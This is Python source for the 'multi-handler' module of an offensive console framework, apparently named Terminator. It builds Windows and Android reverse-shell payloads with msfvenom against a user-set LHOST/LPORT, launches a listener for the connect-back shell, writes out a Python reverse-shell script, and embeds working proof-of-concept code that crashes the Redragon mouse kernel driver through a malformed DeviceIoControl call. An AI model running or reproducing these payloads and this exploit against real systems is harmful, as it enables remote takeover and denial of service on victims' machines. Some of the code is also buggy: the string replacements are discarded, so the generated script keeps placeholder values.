import os
import time
import colorama
import sys
import subprocess
from colorama import Fore, Back, Style
colorama.init()
VER="2.2"
PAYLOAD="payload/win/win_reverse_shell"
LHOST=""
LPORT=""
ERR_TEXT=""
SHELL=Style.BRIGHT+"MULTI-HANDLER"+Style.RESET_ALL
RUN_TEXT=""
DEVICE_NAME=""
shw = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Handler
      show payloads                    Show payloads available for Handler
'''
commands = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Handler
      show payloads                    Show payloads available for Handler

Search Commands
===============

      Command                          Description
      -------                          -----------
      search <name>                    Search for a payload by name

Module Commands
===============

      Command                          Description
      -------                          -----------
      set <option> <value>             Set specified option to specified value
      show <>                          Show specified command, options
      run                              Run the Module
'''
pylds = '''
Payload Name                                    Type             Verify          Description
-------------                                   -----            -------         ------------
payload/poc/redragon_mouse/wr                   Windows          no              Redragon_Mouse Payload (REDRAGON_MOUSE.sys)
payload/win/win_reverse_shell                   Windows          yes             reverse shell Payload (win32, win64)
payload/apk/android_reverse_shell               Android          yes             reverse shell Payload (V.3 - 9)
payload/alien/win_reverse_shell                 Windows          yes             reverse shell Python Payload (win32, win64)
'''
search_payloads = '''
payload/poc/redragon_mouse/wr                   
payload/win/win_reverse_shell                 
payload/apk/android_reverse_shell
payload/alien/win_reverse_shell
'''
def search(name):
    count = 0
    payloads = '''
'''
    try:
        for line2 in search_payloads.split('\n'):
            if name in line2:
                count+=1
                line3 = line2.replace(name, Back.MAGENTA+name+Back.RESET)
                payloads+=line3+'\n'
        if count == 0:
            print(Fore.RED+'[-]'+Fore.RESET+' No Results Found.')
        else:
            print(Fore.BLUE+'[*]'+Fore.RESET+f' Found {count} Results')
            print('---------------------------')
            print(payloads)
    except:
        pass

try:
    tmf = input('\033[4mtmf\033[0m-('+SHELL+') > ').strip(" ")
except KeyboardInterrupt:
    exit()
tmf = tmf.split()
while True:
    if tmf == []:
        pass
    elif tmf[0] == 'help':
        print(commands)
    elif tmf[0] == 'clear':
        os.system('clear')
    elif tmf[0] == 'back' or tmf[0] == 'exit':
        sys.exit()
    elif tmf[0] == 'search':
        if len(tmf) < 2:
            print(Fore.RED+'[-]'+Fore.RESET+' Usage: search <name>')
        else:
            try:
                py_name = tmf[1]
                search(py_name)
            except:
                pass
    elif tmf[0] == 'show':
        if len(tmf) < 2:
            print(shw)
        else:
            try:
                if tmf[1] == 'options':
                    if PAYLOAD == 'payload/win/win_reverse_shell':
                        print('''
Handler ('''+Fore.RED+'''multi/handler'''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------

Payload ('''+Fore.RED+''''''+PAYLOAD+''''''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------
      LHOST           Required          IP Address To Connect Back         '''+LHOST+'''
      LPORT           Required          Port Address                       '''+LPORT+'''

Handler About:

      Handler Title : Multi Handler For Payloads
      Author        : G00Dway
      Version       : '''+VER+'''

Handler Details:

      This Handler Has No Details.
''')
                    elif PAYLOAD == 'payload/apk/android_reverse_shell':
                        print('''
Handler ('''+Fore.RED+'''multi/handler'''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------

Payload ('''+Fore.RED+''''''+PAYLOAD+''''''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------
      LHOST           Required          IP Address To Connect Back         '''+LHOST+'''
      LPORT           Required          Port Address                       '''+LPORT+'''

Handler About:

      Handler Title : Multi Handler For Payloads
      Author        : G00Dway
      Version       : '''+VER+'''

Handler Details:

      This Handler Has No Details.
''')
                    elif PAYLOAD == 'payload/poc/redragon_mouse/wr':
                        print('''
Handler ('''+Fore.RED+'''multi/handler'''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------

Payload ('''+Fore.RED+''''''+PAYLOAD+''''''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------
      ERR_TEXT        Required          Error Text                         '''+ERR_TEXT+'''
      RUN_TEXT        Required          Run Text                           '''+RUN_TEXT+'''
      DEVICE_NAME     Required          Device Name                        '''+DEVICE_NAME+'''

Handler About:

      Handler Title : Multi Handler For Payloads
      Author        : G00Dway
      Version       : '''+VER+'''

Payload About:

      Payload Title : Redragon Gaming Mouse 'REDRAGON_MOUSE.sys' Denial-Of-Service
      Author        : Quadron Research Lab
      Version       : All Versions

Handler Details:

      This Handler Has No Details.
''')
                    elif PAYLOAD == 'payload/alien/win_reverse_shell':
                        print('''
Handler ('''+Fore.RED+'''multi/handler'''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------

Payload ('''+Fore.RED+''''''+PAYLOAD+''''''+Fore.RESET+''') Options:

      Option          Rank              Description                        Current Value
      --------        ------            -------------                      ---------------
      LHOST           Required          IP Address To Connect Back         '''+LHOST+'''
      LPORT           Required          Port Address                       '''+LPORT+'''

Handler About:

      Handler Title : Multi Handler For Payloads
      Author        : G00Dway
      Version       : '''+VER+'''

Payload About:

      Payload Title : Alien Reverse shell payload boo...
      Author        : cyn4nguy
      Version       : All Versions

Handler Details:

      This Handler Has No Details.
''')
                    else:
                        pass
                elif tmf[1] == 'payloads':
                    print(pylds)
                else:
                    print(shw)
                    print(Fore.RED+'[-]'+Fore.RESET+' Invalid Command For "show": "'+tmf[1]+'"')
            except:
                pass
    elif tmf[0] == 'set':
        if len(tmf) < 3:
            print(Fore.RED+'[-]'+Fore.RESET+' Usage: set <option> <value>')
        else:
            try:
                if tmf[1] == 'PAYLOAD' or tmf[1] == 'payload':
                    if tmf[2] == 'payload/win/win_reverse_shell':
                        PAYLOAD=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
                    elif tmf[2] == 'payload/apk/android_reverse_shell':
                        PAYLOAD=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
                    elif tmf[2] == 'payload/poc/redragon_mouse/wr':
                        PAYLOAD=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
                    elif tmf[2] == 'payload/alien/win_reverse_shell':
                        PAYLOAD=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Payload!')
                elif tmf[1] == 'LHOST' or tmf[1] == 'lhost':
                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell' or PAYLOAD == 'payload/alien/win_reverse_shell':
                        LHOST=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' LHOST ==> '+LHOST)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                elif tmf[1] == 'LPORT' or tmf[1] == 'lport':
                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell' or PAYLOAD == 'payload/alien/win_reverse_shell':
                        LPORT=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' LPORT ==> '+LPORT)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                elif tmf[1] == 'ERR_TEXT' or tmf[1] == 'err_text':
                    if PAYLOAD == 'payload/poc/redragon_mouse/wr':
                        ERR_TEXT=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' ERR_TEXT ==> '+ERR_TEXT)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                elif tmf[1] == 'RUN_TEXT' or tmf[1] == 'run_text':
                    if PAYLOAD == 'payload/poc/redragon_mouse/wr':
                        RUN_TEXT=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' RUN_TEXT ==> '+RUN_TEXT)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                elif tmf[1] == 'DEVICE_NAME' or tmf[1] == 'device_name':
                    if PAYLOAD == 'payload/poc/redragon_mouse/wr':
                        DEVICE_NAME=tmf[2]
                        print(Fore.BLUE+'[*]'+Fore.RESET+' DEVICE_NAME ==> '+DEVICE_NAME)
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
            except:
                pass
    elif tmf[0] == 'run':
        if PAYLOAD == "payload/win/win_reverse_shell":
            if LHOST == "" or LPORT == "":
                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
            else:
                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating .EXE Payload...')
                os.system('msfvenom -p windows/shell/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f exe -o /root/.tmf/payload.exe > /dev/null 2>&1')
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
                time.sleep(0.3)
                os.system('chmod +x /root/.tmf/payload.exe > /dev/null 2>&1')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
                try:
                    os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
                except Exception:
                    pass
        elif PAYLOAD == "payload/apk/android_reverse_shell":
            if LHOST == "" or LPORT == "":
                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
            else:
                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating .APK Payload...')
                os.system('msfvenom -p android/shell/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f raw -o /root/.tmf/payload.apk > /dev/null 2>&1')
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
                time.sleep(0.3)
                os.system('chmod +x /root/.tmf/payload.apk > /dev/null 2>&1')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Handler...')
                try:
                    os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
                except Exception:
                    pass
        elif PAYLOAD == 'payload/alien/win_reverse_shell':
            if LHOST == "" or LPORT == "":
                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
            else:
                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Python Payload...')
                with open("/usr/share/Terminator/modules/payloads/alien-shell.log", "r") as alien:
                    for line in alien:
                      data = alien.read()
                      print(Fore.YELLOW+'[+]'+Fore.RESET+' Changing LHOST, LPORT...')
                      data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
                      data.replace('PORT    = 4556', f'PORT    = {LPORT}')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Saving Payload As .PY...')
                os.system('touch /root/.tmf/alien.py > /dev/null 2>&1')
                with open('/root/.tmf/alien.py', 'w') as alien_load:
                    alien_load.write(data)
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Saved At: "/root/.tmf" as alien.py')
                print(Fore.BLUE+'[*]'+Fore.RESET+' Initiliazing Connection...')
                time.sleep(1)
                try:
                    os.system('python3 /usr/share/Terminator/lib/data/handlers/alien-shell-handler.py '+LHOST+' '+LPORT)
                except Exception:
                    pass
        else:
            if ERR_TEXT == "" or RUN_TEXT == "" or DEVICE_NAME == "":
                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
            else:
                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Python Payload...')
                time.sleep(0.6)
                try:
                    if os.path.exists("/usr/share/Terminator/modules/payloads/redragon_mouse.log"):
                        with open("/usr/share/Terminator/modules/payloads/redragon_mouse.log", "w") as c:
                            c.write('''
import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "'''+DEVICE_NAME+'''"

ioctl = 0x222414

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\\\\.\\\GLOBALROOT\\\Device\REDRAGON_MOUSE", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print("'''+ERR_TEXT+'''")

else:
    print("'''+RUN_TEXT+'''")
                    
    buf = '\\x44' * 1000 + '\\x00' * 1000
    bufLength = 2000
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)
''')
                            c.close()
                        os.system('cp -r /usr/share/Terminator/modules/payloads/redragon_mouse.log /root/.tmf > /dev/null 2>&1')
                        os.system('mv /root/.tmf/redragon_mouse.log /root/.tmf/redragon_mouse.py > /dev/null 2>&1')
                        print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                except:
                    pass
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Unknown Command: "'+tmf[0]+'"')
    try:
        tmf = input('\033[4mtmf\033[0m-('+SHELL+') > ').strip(" ")
    except KeyboardInterrupt:
        exit()
    tmf = tmf.split()
